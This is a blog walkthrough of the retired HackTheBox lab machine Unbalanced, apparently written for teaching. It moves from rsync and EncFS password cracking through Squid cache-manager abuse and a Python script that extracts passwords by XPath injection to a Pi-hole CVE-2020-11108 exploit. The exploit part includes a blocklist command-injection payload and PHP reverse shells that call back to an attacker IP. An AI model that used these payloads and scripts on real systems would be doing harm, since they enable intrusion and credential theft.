---
layout: walkthrough
title: HackTheBox - Unbalanced
date: 2020-12-06 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/unbalanced.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Unbalanced --`10.10.10.200`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Unbalanced$ nmap -sV -sC 10.10.10.200
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 08:05 EST
Nmap scan report for 10.10.10.200
Host is up (0.19s latency).
Not shown: 994 closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp   open     rsync          (protocol version 31)
3128/tcp  open     http-proxy     Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
5190/tcp  filtered aol
5925/tcp  filtered unknown
32770/tcp filtered sometimes-rpc3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.63 seconds
```

</details>

From the output shown above, we can see that the machine is a Linux machine, and I added `unbalanced.htb` to the `/etc/hosts` file. When browsing to <http://unbalanced.htb:3128> we were presented with the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img1.png"  style="width: 70%" />
</p>

It didn't seem likely that anything would initially be available using the Squid proxy, you could use squid as a way of enumerating local ports through ffuf, however I decided to move on to the other open port -- rsync using TCP port 873. 

### rsync Enumeration

> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification timesand sizes of files. It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing network usage. Zlib may be used for additional data compression, and SSH or stunnel can be used for security.

The following URL <https://blog.netspi.com/linux-hacking-case-studies-part-1-rsync> has a ton of information about using rsync for enumeration. After connecting to the port with netcat, it will return the rsync version. As described in the blog post above, in order to enumerate the service we need to begin by including the same banner version back to the host, following on from that we can begin enumeration using the `#list` command. 

<details>

```bat

vagrant@ko:~/Desktop/HackTheBox/Unbalanced$ nc -vn 10.10.10.200 873
(UNKNOWN) [10.10.10.200] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
conf_backups    EncFS-encrypted configuration backups
```
</details>

As shown above, I managed to enumerate the `conf_backups` folder from the server. Using this information, I was able to use the rsync protocol to retrieve encrypted data using the following command:

```bat
rsync 10.10.10.200::conf_backups
```

<details>

```bat
vagrant@ko:~$ rsync 10.10.10.200::
conf_backups    EncFS-encrypted configuration backups
vagrant@ko:~$ rsync 10.10.10.200::conf_backups
drwxr-xr-x          4,096 2020/04/04 11:05:32 .
-rw-r--r--            288 2020/04/04 11:05:31 ,CBjPJW4EGlcqwZW4nmVqBA6
-rw-r--r--            135 2020/04/04 11:05:31 -FjZ6-6,Fa,tMvlDsuVAO7ek
-rw-r--r--          1,297 2020/04/02 09:06:19 .encfs6.xml
-rw-r--r--            154 2020/04/04 11:05:32 0K72OfkNRRx3-f0Y6eQKwnjn
-rw-r--r--             56 2020/04/04 11:05:32 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
-rw-r--r--            190 2020/04/04 11:05:32 2VyeljxHWrDX37La6FhUGIJS
-rw-r--r--            386 2020/04/04 11:05:31 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
-rw-r--r--            537 2020/04/04 11:05:31 3cdBkrRF7R5bYe1ZJ0KYy786
-rw-r--r--            560 2020/04/04 11:05:31 3xB4vSQH-HKVcOMQIs02Qb9,
-rw-r--r--            275 2020/04/04 11:05:32 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
-rw-r--r--            463 2020/04/04 11:05:32 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
-rw-r--r--          2,169 2020/04/04 11:05:31 5FTRnQDoLdRfOEPkrhM2L29P
-rw-r--r--            238 2020/04/04 11:05:31 5IUA28wOw0wwBs8rP5xjkFSs
-rw-r--r--          1,277 2020/04/04 11:05:31 6R1rXixtFRQ5c9ScY8MBQ1Rg
-rw-r--r--            108 2020/04/04 11:05:31 7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,                      
-rw-r--r--          1,339 2020/04/04 11:05:32 7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1                      
-rw-r--r--          1,050 2020/04/04 11:05:31 8CBL-MBKTDMgB6AT2nfWfq-e                                            
-rw-r--r--            152 2020/04/04 11:05:31 8XDA,IOhFFlhh120yl54Q0da                                            
-rw-r--r--             29 2020/04/04 11:05:31 8e6TAzw0xs2LVxgohuXHhWjM                                            
-rw-r--r--          5,721 2020/04/04 11:05:31 9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0                      
-rw-r--r--          2,980 2020/04/04 11:05:31 A4qOD1nvqe9JgKnslwk1sUzO                                            
-rw-r--r--            443 2020/04/04 11:05:31 Acv0PEQX8vs-KdK307QNHaiF                                            
-rw-r--r--            935 2020/04/04 11:05:31 B6J5M3OP0X7W25ITnaZX753T                                            
-rw-r--r--          1,521 2020/04/04 11:05:32 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1                      
-rw-r--r--          2,359 2020/04/04 11:05:31 ECXONXBBRwhb5tYOIcjjFZzh                                            
-rw-r--r--          1,464 2020/04/04 11:05:32 F4F9opY2nhVVnRgiQ,OUs-Y0                                            
-rw-r--r--            354 2020/04/04 11:05:32 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1                      
-rw-r--r--          3,275 2020/04/04 11:05:31 FSXWRSwW6vOvJ0ExPK0fXJ6F                                            
-rw-r--r--             95 2020/04/04 11:05:31 IymL3QugM,XxLuKEdwJJOOpi                                            
-rw-r--r--            340 2020/04/04 11:05:31 KPYfvxIoOlrRjTY18zi8Wne-
-rw-r--r--            158 2020/04/04 11:05:32 Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
-rw-r--r--            518 2020/04/04 11:05:31 Kpo3MHQxksW2uYX79XngQu-f
-rw-r--r--          1,448 2020/04/04 11:05:31 KtFc,DR7HqmGdPOkM2CpLaM9
-rw-r--r--            714 2020/04/04 11:05:31 Mv5TtpmUNnVl-fgqQeYAy8uu
-rw-r--r--            289 2020/04/04 11:05:31 MxgjShAeN6AmkH2tQAsfaj6C
-rw-r--r--          4,499 2020/04/04 11:05:31 Ni8LDatT134DF6hhQf5ESpo5
-rw-r--r--          2,187 2020/04/04 11:05:31 Nlne5rpWkOxkPNC15SEeJ8g,
-rw-r--r--            199 2020/04/04 11:05:32 OFG2vAoaW3Tvv1X2J5fy4UV8
-rw-r--r--            914 2020/04/04 11:05:32 OvBqims-kvgGyJJqZ59IbGfy
-rw-r--r--            427 2020/04/04 11:05:31 StlxkG05UY9zWNHBhXxukuP9
-rw-r--r--             17 2020/04/04 11:05:31 TZGfSHeAM42o9TgjGUdOSdrd
-rw-r--r--        316,561 2020/04/04 11:05:31 VQjGnKU1puKhF6pQG1aah6rc
-rw-r--r--          2,049 2020/04/04 11:05:31 W5,ILrUB4dBVW-Jby5AUcGsz
-rw-r--r--            685 2020/04/04 11:05:31 Wr0grx0GnkLFl8qT3L0CyTE6
-rw-r--r--            798 2020/04/04 11:05:31 X93-uArUSTL,kiJpOeovWTaP
-rw-r--r--          1,591 2020/04/04 11:05:31 Ya30M5le2NKbF6rD-qD3M-7t
-rw-r--r--          1,897 2020/04/04 11:05:31 Yw0UEJYKN,Hjf-QGqo3WObHy
-rw-r--r--            128 2020/04/04 11:05:31 Z8,hYzUjW0GnBk1JP,8ghCsC
-rw-r--r--          2,989 2020/04/04 11:05:31 ZXUUpn9SCTerl0dinZQYwxrx
-rw-r--r--             42 2020/04/04 11:05:31 ZvkMNEBKPRpOHbGoefPa737T
-rw-r--r--          1,138 2020/04/04 11:05:31 a4zdmLrBYDC24s9Z59y-Pwa2
-rw-r--r--          3,643 2020/04/04 11:05:31 c9w3APbCYWfWLsq7NFOdjQpA
-rw-r--r--            332 2020/04/04 11:05:31 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
-rw-r--r--          2,592 2020/04/04 11:05:31 dF2GU58wFl3x5R7aDE6QEnDj
-rw-r--r--          1,268 2020/04/04 11:05:31 dNTEvgsjgG6lKBr8ev8Dw,p7
-rw-r--r--            422 2020/04/04 11:05:31 gK5Z2BBMSh9iFyCFfIthbkQ6
-rw-r--r--          2,359 2020/04/04 11:05:31 gRhKiGIEm4SvYkTCLlOQPeh-
-rw-r--r--          1,996 2020/04/04 11:05:32 hqZXaSCJi-Jso02DJlwCtYoz
-rw-r--r--          1,883 2020/04/04 11:05:32 iaDKfUAHJmdqTDVZsmCIS,Bn
-rw-r--r--          4,572 2020/04/04 11:05:31 jIY9q65HMBxJqUW48LJIc,Fj
-rw-r--r--          5,068 2020/04/04 11:05:31 kdJ5whfqyrkk6avAhlX-x0kh
-rw-r--r--            657 2020/04/04 11:05:31 kheep9TIpbbdwNSfmNU1QNk-
-rw-r--r--            612 2020/04/04 11:05:31 l,LY6YoFepcaLg67YoILNGg0
-rw-r--r--             46 2020/04/04 11:05:31 lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
-rw-r--r--          1,636 2020/04/04 11:05:31 mMGincizgMjpsBjkhWq-Oy0D
-rw-r--r--          1,743 2020/04/04 11:05:31 oPu0EVyHA6,KmoI1T,LTs83x
-rw-r--r--             52 2020/04/04 11:05:31 pfTT,nZnCUFzyPPOeX9NwQVo
-rw-r--r--          1,050 2020/04/04 11:05:31 pn6YPUx69xqxRXKqg5B5D2ON
-rw-r--r--            650 2020/04/04 11:05:31 q5RFgoRK2Ttl3U5W8fjtyriX
-rw-r--r--            660 2020/04/04 11:05:32 qeHNkZencKDjkr3R746ZzO5K
-rw-r--r--          2,977 2020/04/04 11:05:32 sNiR-scp-DZrXHg4coa9KBmZ
-rw-r--r--            820 2020/04/04 11:05:32 sfT89u8dsEY4n99lNsUFOwki
-rw-r--r--            254 2020/04/04 11:05:31 uEtPZwC2tjaQELJmnNRTCLYU
-rw-r--r--            203 2020/04/04 11:05:31 vCsXjR1qQmPO5g3P3kiFyO84
-rw-r--r--            670 2020/04/04 11:05:32 waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5

```
</details>

I downloaded the entire directory in order to determine what to do going forward. As we can see, this is most likely meant to be an encrypted `encfs.xml` file due to the presence of the `.encfs6.xml` file. The contents of the file are shown below:

<details>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE boost_serialization>
<boost_serialization signature="serialization::archive" version="7">
    <cfg class_id="0" tracking_level="0" version="20">
        <version>20100713</version>
        <creator>EncFS 1.9.5</creator>
        <cipherAlg class_id="1" tracking_level="0" version="0">
            <name>ssl/aes</name>
            <major>3</major>
            <minor>0</minor>
        </cipherAlg>
        <nameAlg>
            <name>nameio/block</name>
            <major>4</major>
            <minor>0</minor>
        </nameAlg>
        <keySize>192</keySize>
        <blockSize>1024</blockSize>
        <plainData>0</plainData>
        <uniqueIV>1</uniqueIV>
        <chainedNameIV>1</chainedNameIV>
        <externalIVChaining>0</externalIVChaining>
        <blockMACBytes>0</blockMACBytes>
        <blockMACRandBytes>0</blockMACRandBytes>
        <allowHoles>1</allowHoles>
        <encodedKeySize>44</encodedKeySize>
        <encodedKeyData>
GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=
</encodedKeyData>
        <saltLen>20</saltLen>
        <saltData>
mRdqbk2WwLMrrZ1P6z2OQlFl8QU=
</saltData>
        <kdfIterations>580280</kdfIterations>
        <desiredKDFDuration>500</desiredKDFDuration>
    </cfg>
</boost_serialization>
```
</details>

Using the folder contents I previously downloaded, I could use John the Ripper to convert the encrypted file system (EncFS) to the required format:

```bat
/usr/share/john/encfs2john.py rsync/ > rsync.xml.john

vagrant@ko:~/Desktop/HackTheBox/Unbalanced$ cat rsync.xml.john 
rsync/:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
```

Now that I had the folder in the required format and I have the password hash, I could use John the Ripper again in an attempt to crack the password:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Unbalanced$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt rsync.xml.john 
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bubblegum        (rsync/)
1g 0:00:00:10 DONE (2020-11-12 08:36) 0.09990g/s 73.52p/s 73.52c/s 73.52C/s bambam..raquel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
</details>


Success! We now have the password `bubblegum`. More information about cracking encrypted file systems is described here: <https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml>. Since we have the password, we can now mount the directory using the following `encfs` command:

```bat
vagrant@ko:~/Desktop/HackTheBox/Unbalanced$ encfs ~/Desktop/HackTheBox/Unbalanced/rsync/ ~/Desktop/HackTheBox/Unbalanced/encfs_mount/
```

With the file system now mounted, we are able to access the folder just as if we were on the host, and we have access to all the files. The folder contents are shown in the image below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img2.png"  style="width: 70%" />
</p>

### Squid Proxy

Browsing through the file contents, I decided to view the contents of `squid.conf` since the squid proxy port on the host was open:

<details>

```conf
# Recommended minimum configuration:
#

# Example rule allowing access from your local networks.
# Adapt to list your (internal) IP networks from where browsing
# should be allowed
acl localnet src 0.0.0.1-0.255.255.255  # RFC 1122 "this" network (LAN)
acl localnet src 10.0.0.0/8             # RFC 1918 local private network (LAN)
acl localnet src 100.64.0.0/10          # RFC 6598 shared address space (CGN)
acl localnet src 169.254.0.0/16         # RFC 3927 link-local (directly plugged) machines
acl localnet src 172.16.0.0/12          # RFC 1918 local private network (LAN)
acl localnet src 192.168.0.0/16         # RFC 1918 local private network (LAN)
acl localnet src fc00::/7               # RFC 4193 local private network range
acl localnet src fe80::/10              # RFC 4291 link-local (directly plugged) machines

acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl CONNECT method CONNECT

#
# INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS
#
include /etc/squid/conf.d/*

# Example rule allowing access from your local networks.
# Adapt localnet in the ACL section to list your (internal) IP networks
# from where browsing should be allowed
#http_access allow localnet
http_access allow localhost

# Allow access to intranet
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net

# And finally deny all other access to this proxy
http_access deny all

```
</details>


The contents shown above were the parts that I deemed most relevant. They included some local subnets as well as additional ACLs for safe ports. Additionally, the file included a new subnet: `intranet.unbalanced.htb` which I added to the `/etc/hosts` file. From there, I decided to search for passwords within the files using grep:

```bat
grep -R passwd
```

<details>

```conf
vagrant@ko:~/Desktop/HackTheBox/Unbalanced/encfs_mount$ grep -R passwd
reportbug.conf:# smtppasswd XXX
squid.conf:#  TAG: cachemgr_passwd
squid.conf:#    Usage: cachemgr_passwd password action action ...
squid.conf:# cachemgr_passwd secret shutdown
squid.conf:# cachemgr_passwd lesssssssecret info stats/objects
squid.conf:# cachemgr_passwd disable all
squid.conf:cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
squid.conf:cachemgr_passwd disable all
nsswitch.conf:passwd:         files systemd
adduser.conf:# Please note that system software, such as the users allocated by the base-passwd

```
</details>

As shown above, I now has access to the Cache Manager password: `Thah$Sh1`. Before I decided to work with the cache manager, I added a squid proxy connection to Firefox and browsed to the web application which presented me with the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img3.png"  style="width: 70%" />
</p>

The web application didn't seem to have an exploitable login page, so I decided to continue enumerating the cache manager. In order to interact with it, I needed to install squid client on my Kali machine:

```bat
sudo apt-get install squidclient
```

You could also interact with squid through HTTP requests, but I prefer to use squid client. Once the squid client was installed, I was able to list the available menu options using the following command:

```bat
squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu
```

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Unbalanced/encfs_mount$ squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Thu, 12 Nov 2020 14:38:18 GMT
Content-Type: text/plain;charset=utf-8
Expires: Thu, 12 Nov 2020 14:38:18 GMT
Last-Modified: Thu, 12 Nov 2020 14:38:18 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

 index                  Cache Manager Interface                 disabled
 menu                   Cache Manager Menu                      protected
 offline_toggle         Toggle offline_mode setting             disabled
 shutdown               Shut Down the Squid Process             disabled
 reconfigure            Reconfigure Squid                       disabled
 rotate                 Rotate Squid Logs                       disabled
 pconn                  Persistent Connection Utilization Histograms    protected
 mem                    Memory Utilization                      protected
 diskd                  DISKD Stats                             protected
 squidaio_counts        Async IO Function Counters              disabled
 config                 Current Squid Configuration             disabled
 client_list            Cache Client List                       disabled
 comm_epoll_incoming    comm_incoming() stats                   disabled
 ipcache                IP Cache Stats and Contents             disabled
 fqdncache              FQDN Cache Stats and Contents           protected
 idns                   Internal DNS Statistics                 disabled
 redirector             URL Redirector Stats                    disabled
 store_id               StoreId helper Stats                    disabled
 external_acl           External ACL stats                      disabled
 http_headers           HTTP Header Statistics                  disabled
 info                   General Runtime Information             disabled
 service_times          Service Times (Percentiles)             disabled
 filedescriptors        Process Filedescriptor Allocation       protected
 objects                All Cache Objects                       protected
 vm_objects             In-Memory and In-Transit Objects        protected
 io                     Server-side network read() size histograms      disabled
 counters               Traffic and Resource Counters           protected
 peer_select            Peer Selection Algorithms               disabled
 digest_stats           Cache Digest and ICP blob               disabled
 5min                   5 Minute Average of Counters            protected
 60min                  60 Minute Average of Counters           protected
 utilization            Cache Utilization                       disabled
 histograms             Full Histogram Counts                   protected
 active_requests        Client-side Active Requests             disabled
 username_cache         Active Cached Usernames                 disabled
 openfd_objects         Objects with Swapout files open         disabled
 store_digest           Store Digest                            disabled
 store_log_tags         Histogram of store.log tags             disabled
 storedir               Store Directory Stats                   disabled
 store_io               Store IO Interface Stats                disabled
 store_check_cachable_stats     storeCheckCachable() Stats              disabled
 refresh                Refresh Algorithm Statistics            disabled
 delay                  Delay Pool Levels                       disabled
 forward                Request Forwarding Statistics           disabled
 cbdata                 Callback Data Registry Contents         protected
 sbuf                   String-Buffer statistics                protected
 events                 Event Queue                             protected
 netdb                  Network Measurement Database            disabled
 asndb                  AS Number Database                      disabled
 carp                   CARP information                        disabled
 userhash               peer userhash information               disabled
 sourcehash             peer sourcehash information             disabled
 server_list            Peer Cache Statistics                   disabled
```
</details>

As shown above, very few operations were allowed (most operations were disabled on the host). I decided to start with looking into the `fqdncache`:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Unbalanced/encfs_mount$ squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:fqdncache
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Thu, 12 Nov 2020 14:40:12 GMT
Content-Type: text/plain;charset=utf-8
Expires: Thu, 12 Nov 2020 14:40:12 GMT
Last-Modified: Thu, 12 Nov 2020 14:40:12 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

FQDN Cache Statistics:
FQDNcache Entries In Use: 14
FQDNcache Entries Cached: 12
FQDNcache Requests: 48328
FQDNcache Hits: 0
FQDNcache Negative Hits: 25510
FQDNcache Misses: 22818
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
10.10.14.11                                    N  -27823   0
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
 172.31.179.2                                   H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
10.10.14.174                                   N  -3429   0
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
10.10.14.68                                    N  -278   0
10.10.14.247                                   N  -2792   0
```
</details>


From the information shown above, I now had access to additional hosts through the squid proxy: `172.31.179.2` and `172.31.179.3`, I also assumed that based on this, there was a `172.31.179.1` host available.

### XPath / SQL Based Injection

When navigating to `http://172.31.179.2/intranet.php` and `http://172.31.179.3/intranet.php`, the web page that I was presented with was the same as the one shown above. However, upon navigating to `http://172.31.179.1/intranet.php`, the web page's login form was found to be vulnerable to XPath/SQL based injection. A simple check within both the username and password fields for `' or' 1=1 --` resulted in the following:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img4.png"  style="width: 50%" />
</p>

We now had information for the following accounts:
* rita@unbalanced.htb
* jim@unbalanced.htb
* bryan@unbalanced.htb
* sarah@unbalanced.htb

After playing with the fields for a while, I determine that it was the password field that was injectable, not the username field -- more information on XPath injection can be found here: <https://owasp.org/www-community/attacks/XPATH_Injection>. Based on this, it was possible to create a simple Python based script to extract the passwords for each of the aforementioned users using Boolean based XPath injection:

<details>

```python
#!/usr/bin/python3
import string
from bs4 import BeautifulSoup
import requests


def check_result(i,c):
    payload={"Username": "doesntmatter","Password": f"' or substring(Password,{i},1)='{c}"}
    url = "http://172.31.179.1/intranet.php"
    proxy = {"http": "http://10.10.10.200:3128"}
    r = requests.post(url,data=payload, proxies=proxy)
    return r

def brute():
    usernames = ["rita", "jim", "bryan", "sarah"]
    for user in usernames:
            print(f"{user}: ", end="", flush=True)
            for i in range(1, 33):
                for c in string.printable[:-5]:
                    print(c, end="", flush=True)
                    r = check_result(i,c)
                    soup = BeautifulSoup(r.text, "html.parser")
                    if d := soup.find("div", {"class": "m4"}):
                        if [p for p in d.find_all("p", {"class": "w3-opacity"}) if p.text.strip() == user]:
                            break
                    print("\b", end="", flush=True)
                else:
                    print(" ")
                    break
brute()

```
</details>

If you are uncertain about any part of the script shown above, please reach out to me and we can work through the semantics of it! The output of the script is shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Unbalanced$ python3 userenum.py 
rita: password01!                                                                                                 
jim: stairwaytoheaven                                                                                             
bryan: ireallyl0vebubblegum!!!                                                                                    
sarah: sarah4evah 
```
</details>


## Lateral Movement using Bryan

Using the credentials above, I attempted to log in to the host using the other open port -- SSH. The credentials for Bryan worked and I was able to successfully authenticate to the host:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img5.png"  style="width: 70%" />
</p>

Based on the simple host enumeration from the commands above, `ifconfig` did not work on the host. In order to determine the IP Address, I used the `ip` commands:

<details>

```text

bryan@unbalanced:/$ ip n
10.10.10.2 dev ens160 lladdr 00:50:56:b9:30:b0 REACHABLE
172.31.179.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:03 STALE
172.31.179.2 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:02 STALE
172.31.179.1 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:01 REACHABLE
172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE
fe80::250:56ff:feb9:30b0 dev ens160 lladdr 00:50:56:b9:30:b0 router STALE
```

</details>

After running the above command I now had information about a new IP Address: `172.31.11.3`, additionally, I found a TODO file on the host which contained the following information:

```text
bryan@unbalanced:~$ cat TODO 
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
```

### Pi-Hole Exploitation

Based on the information about the Pi-Hole shown above, I navigated to the IP address through the squid proxy and was presented with the default Pi-Hole page and administration panel. Using the default administrator password: `admin`, I was able to log in to the administrative panel:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img6.png"  style="width: 100%" />
</p>

The footer of the Pi-Hole web application revealed the following information:
* Pi-hole Version  v4.3.2            
* Web Interface Version v4.3            
* FTL Version  v4.3.1     
            
Some basic Google searches lead me to the following post: <https://frichetten.com/blog/cve-2020-11108-pihole-rce/>.

> The following is a technical writeup for CVE-2020-11108, a vulnerability that allows an authenticated user of the Pi-hole web application to gain remote code execution and escalate privileges to root. This vulnerability affects Pi-hole v4.4 and below.

Using the information described in the blog post, I attempted to exploit the administrative interface to gain a privileged shell on the host. The first phase of the exploitation began with:

* Create a netcat listener locally.
* Navigating to Settings &rarr; Blocklists.
* Enter the following payload as a new URL.

```bat
http://10.10.14.21#" -o fun.php -d "
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img7.png"  style="width: 70%" />
</p>

Now that the URL was added to the blocklist, I needed to Click "Save and Update", and a few seconds later, I received a connection back to my netcat listener on port 80. Once the connection was established, I needed to do the following:

1. Provide a 200 response to the initial connection `HTTP/1.1 200 OK`
2. Hit enter twice, type some random words, hit enter twice, Ctrl+c
3. Restart the netcat listener and click update again
4. Enter reverse shell payload

The reverse shell payload is provided below:

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.21/8888 0>&1'");
?>
```

In addition to the above commands, I also needed to create a new netcat listener on port 8888 in order to interact with the reverse shell --  The image below shows the sequence of HTTP requests:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img8.png"  style="width: 70%" />
</p>

Once the requests were submitted, the Pi-Hole was successfully exploited and I received a connection back from the host as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img9.png"  style="width: 70%" />
</p>

Since this is an IoT device, they are generally insecure and you would have been able to skip the next part and read the relevant files within the root directory in order to complete this machine. However, I wanted to complete the exploit and gain a privileged shell on the Pi-Hole itself. 

## Privilege Escalation using Pi-Hole

Now that I had access to the `www-data` user on the host, I was able to being the second portion of the exploit. The second portion was nearly identical to the previous one, the main difference being that I was simply overwriting the `teleporter.php` file on the server with an additional reverse shell.

As with the initial foothold and using the information described in the blog post, I attempted to exploit the administrative interface to gain a privileged shell on the host. The second phase of the exploitation began with:

* Creating a netcat listener locally.
* Navigating to Settings &rarr; Blocklists.
* Enter the following payload as a new URL.

```bat
http://10.10.14.21#" -o teleporter.php -d "
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img10.png"  style="width: 50%" />
</p>

Now that the URL was added to the blocklist, I needed to Click "Save and Update", and a few seconds later, I received a connection back to the netcat listener on port 80. Once the connection was established, I needed to do the following:

1. Provide a 200 response to the initial connection `HTTP/1.1 200 OK`
2. Hit enter twice, type some words, hit enter twice, Ctrl+c
3. Restart listener and click update again
4. Enter reverse shell payload

The reverse shell payload is provided below:

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.21/9999 0>&1'");
?>
```

In addition to the above commands, I also needed to create a new netcat listener on port 9999 --  The image below shows the sequence of HTTP requests:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img11.png"  style="width: 70%" />
</p>

> With a shell you’ve gained previously, run `sudo pihole -a -t` (www-data has a sudo rule to call pi-hole). This command will call `teleporter.php` as root. If you’ve overwritten it with a reverse shell payload (for example) you will be root.

Once the requests were submitted and I ran `sudo pihole -a -t` using the initial reverse shell, the Pi-Hole was successfully exploited and I received a connection back from the host as shown below:

<p class="imgMiddle">
